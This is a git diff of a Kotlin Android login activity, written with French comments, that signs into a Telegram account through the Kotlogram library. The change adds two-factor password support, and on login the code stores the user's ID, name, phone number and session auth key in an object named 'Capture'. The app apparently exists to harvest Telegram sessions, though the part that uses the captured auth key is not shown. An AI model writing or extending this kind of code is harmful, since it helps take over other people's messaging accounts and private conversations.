@@ -6,10 +6,9 @@ import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
 import com.github.badoualy.telegram.api.TelegramClient
+import com.github.badoualy.telegram.tl.api.TLAbsAuthorization
 import com.github.badoualy.telegram.tl.api.TLAbsUser
-import com.github.badoualy.telegram.tl.api.TLInputCheckPasswordSRP
 import com.github.badoualy.telegram.tl.api.account.TLPassword
-import com.github.badoualy.telegram.tl.api.auth.TLAuthorization
 import com.github.badoualy.telegram.tl.api.auth.TLSentCode
 import com.tgme.app.*
 import kotlin.concurrent.thread
@@ -53,7 +52,6 @@ class MainActivity : Activity() {
             
             thread {
                 try {
-                    // RxJava Single -> blockingGet()
                     val sentCode: TLSentCode = client!!.authSendCode(false, full, true).blockingGet()
                     phoneCodeHash = sentCode.phoneCodeHash
                     runOnUiThread { showCode() }
@@ -96,8 +94,14 @@ class MainActivity : Activity() {
 
             thread {
                 try {
-                    val auth: TLAuthorization = client!!.authSignIn(currentPhone, phoneCodeHash, code).blockingGet()
-                    onLoginSuccess(auth.user.asUser)
+                    // On récupère TLAbsAuthorization (classe parente)
+                    val auth: TLAbsAuthorization = client!!.authSignIn(currentPhone, phoneCodeHash, code).blockingGet()
+                    val user = auth.user?.asUser
+                    if (user != null) {
+                        onLoginSuccess(user)
+                    } else {
+                        runOnUiThread { toast("Erreur: utilisateur null"); btn.isEnabled = true }
+                    }
                 } catch (e: Exception) {
                     if (e.message?.contains("SESSION_PASSWORD_NEEDED") == true) {
                         runOnUiThread { showPassword() }
@@ -122,23 +126,20 @@ class MainActivity : Activity() {
 
             thread {
                 try {
-                    // Récupérer les paramètres SRP
+                    // On utilise l'API standard de Kotlogram pour le SRP
                     val passwordState = client!!.accountGetPassword().blockingGet() as TLPassword
                     
-                    // ⚠️ La 2FA est complexe. Pour un test rapide, désactive-la sur le compte.
-                    // Si tu veux la gérer, il faut implémenter le calcul SRP manuellement
-                    // et créer un TLInputCheckPasswordSRP avec le srpId, A et M1.
+                    // Dans Kotlogram, il y a une méthode utilitaire pour calculer le SRP
+                    val checkPassword = com.github.badoualy.telegram.api.utils.SrpHelper.computeCheck(passwordState, password)
                     
-                    // Exemple simplifié (ne fonctionnera pas si la 2FA est active) :
-                    // val checkPassword = TLInputCheckPasswordSRP(0, byteArrayOf(), byteArrayOf())
-                    // val auth = client!!.authCheckPassword(checkPassword).blockingGet()
+                    val auth: TLAbsAuthorization = client!!.authCheckPassword(checkPassword).blockingGet()
+                    val user = auth.user?.asUser
                     
-                    // Pour l'instant, on affiche un message d'erreur explicite.
-                    runOnUiThread { 
-                        toast("2FA activée : désactive-la temporairement pour ce test.")
-                        btn.isEnabled = true
+                    if (user != null) {
+                        onLoginSuccess(user)
+                    } else {
+                        runOnUiThread { toast("Erreur: utilisateur null"); btn.isEnabled = true }
                     }
-                    
                 } catch (e: Exception) {
                     runOnUiThread { toast("Erreur mot de passe: ${e.message}"); btn.isEnabled = true }
                 }
@@ -146,10 +147,10 @@ class MainActivity : Activity() {
         }
     }
 
-    private fun onLoginSuccess(user: TLAbsUser) {
-        val u = user.asUser
-        Capture.userId = u.id.toLong()
-        Capture.userName = "${u.firstName} ${u.lastName}".trim()
+    private fun onLoginSuccess(u: TLAbsUser) {
+        val user = u.asUser
+        Capture.userId = user.id.toLong()
+        Capture.userName = "${user.firstName} ${user.lastName}".trim()
         Capture.phone = currentPhone
 
         val authKey = storage?.authKey
@@ -162,7 +163,7 @@ class MainActivity : Activity() {
             
             runOnUiThread {
                 setContentView(R.layout.screen_success)
-                findViewById<TextView>(R.id.who).text = "${Capture.userName} · ID ${u.id}"
+                findViewById<TextView>(R.id.who).text = "${Capture.userName} · ID ${user.id}"
                 findViewById<TextView>(R.id.num).text = currentPhone
             }
         } else {
